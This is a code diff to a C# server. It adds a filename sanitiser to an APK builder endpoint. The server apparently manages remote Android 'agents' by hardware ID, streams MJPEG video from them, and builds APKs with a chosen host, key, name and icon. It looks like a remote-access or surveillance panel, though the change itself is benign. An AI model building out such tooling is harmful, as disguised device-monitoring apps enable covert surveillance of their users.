@@ -253,7 +253,23 @@ app.MapGet("/api/agents/{hwid}/{kind}.mjpg", async (string hwid, string kind, Ht
     catch (Exception ex) { Log.Warn("mjpeg: " + ex.Message); }
 });
 
-// ───────────── APK builder (thay assets/zk.conf + ký v2, không cần JDK) ─────────────
+// ─── APK builder: dat ten file APK ───
+static string SafeApkName(string? raw, string fallbackHost)
+{
+    var s = (raw ?? "").Trim();
+    if (s.Length == 0) return $"ZekoDroid-{fallbackHost.Replace('.', '_')}.apk";
+    var sb = new System.Text.StringBuilder();
+    foreach (var ch in s)
+    {
+        if (char.IsLetterOrDigit(ch) || ch == '-' || ch == '_' || ch == '.') sb.Append(ch);
+        else sb.Append('_');
+    }
+    var name = sb.ToString().Trim('.', '_');
+    if (name.Length == 0) name = "ZekoDroid";
+    if (name.Length > 64) name = name[..64];
+    if (!name.EndsWith(".apk", StringComparison.OrdinalIgnoreCase)) name += ".apk";
+    return name;
+}
 ApkBuilder.BaseApkPath = Environment.GetEnvironmentVariable("ZK_BASE_APK")
     ?? Path.Combine(AppContext.BaseDirectory, "builder", "zk_base.apk");
 if (!File.Exists(ApkBuilder.BaseApkPath))
@@ -280,6 +296,7 @@ app.MapPost("/api/builder/build", async (HttpContext ctx) =>
     var psk = body?["psk"]?.ToString() ?? "";
     var appName = body?["name"]?.ToString();
     var homeUrl = body?["home"]?.ToString();
+    var fileName = body?["filename"]?.ToString();
 
     // cho phép gửi "url" đầy đủ (http://1.2.3.4:7878) thay vì host+port
     var urlRaw = body?["url"]?.ToString();
@@ -305,7 +322,7 @@ app.MapPost("/api/builder/build", async (HttpContext ctx) =>
     var res = ApkBuilder.Build(host.Trim(), port, psk, icon, appName, homeUrl);
     if (res.Apk is null) return Results.Json(new { error = res.Error }, statusCode: 400);
     Log.Ok($"builder: {host}:{port} name={appName ?? "-"} home={(string.IsNullOrWhiteSpace(homeUrl) ? "-" : homeUrl)} -> {res.Apk.Length / 1024} KB ({sw.ElapsedMilliseconds} ms)");
-    var name = $"ZekoDroid-{host.Replace('.', '_')}.apk";
+    var name = SafeApkName(fileName, host);
     return Results.File(res.Apk, "application/vnd.android.package-archive", name);
 });
 // ───────────── quản trị: users / sessions / logs ─────────────
